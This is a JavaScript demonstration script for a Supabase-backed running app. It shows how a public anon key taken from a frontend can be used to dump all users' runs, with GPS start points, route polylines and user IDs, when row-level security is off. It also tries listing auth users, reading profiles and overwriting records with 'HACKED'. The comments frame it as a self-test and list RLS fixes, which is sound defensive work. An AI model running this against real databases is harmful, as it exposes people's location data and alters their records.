// ðŸš¨ SECURITY DEMONSTRATION: How Easy It Is To Steal Data
// This shows exactly how an attacker would exploit your current setup

// Step 1: Extract credentials from your website (anyone can do this)
// Method 1: View page source and look for environment variables
// Method 2: Open browser dev tools â†’ Network tab â†’ See API calls
// Method 3: Use curl to extract from built files

// Step 2: Create malicious client (2 lines of code)
import { createClient } from '@supabase/supabase-js'

// These are extracted from your public website:
const STOLEN_URL = 'https://your-project.supabase.co'  // From your frontend
const STOLEN_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'  // From your frontend

const maliciousClient = createClient(STOLEN_URL, STOLEN_KEY)

// Step 3: Steal all user data (WITHOUT RLS - current state)
async function stealAllData() {
  try {
    // This would return ALL users' runs without RLS:
    const { data: stolenRuns, error } = await maliciousClient
      .from('runs')
      .select('*')
    
    if (error) {
      console.log('âœ… RLS is working! Error:', error.message)
      return
    }
    
    // Without RLS, this would succeed:
    console.log(`ðŸš¨ STOLEN ${stolenRuns.length} runs from ALL users!`)
    console.log('Stolen data includes:')
    stolenRuns.forEach(run => {
      console.log(`- ${run.name}: ${run.distance}m at ${run.start_latlng}`)
      console.log(`  User: ${run.user_id}`)
      console.log(`  Route: ${run.strava_data?.map?.summary_polyline}`)
    })
    
  } catch (error) {
    console.log('âœ… Attack failed due to security measures')
  }
}

// Step 4: Advanced attacks
async function advancedAttacks() {
  // Try to get user authentication data
  const { data: users } = await maliciousClient.auth.admin.listUsers()
  
  // Try to access other tables
  const { data: profiles } = await maliciousClient.from('profiles').select('*')
  
  // Try to modify data
  const { data: modified } = await maliciousClient
    .from('runs')
    .update({ name: 'HACKED' })
    .eq('id', 'some-run-id')
}

// HOW TO PREVENT THIS:
// 1. Enable RLS (Row Level Security)
// 2. Create policies that filter by auth.uid() = user_id
// 3. Test that unauthorized access returns empty results

// TESTING YOUR SECURITY:
// Run this script against your database to see if it's vulnerable
// If it returns data â†’ YOU HAVE A SECURITY BREACH
// If it returns empty/error â†’ Your RLS is working

export { stealAllData, advancedAttacks }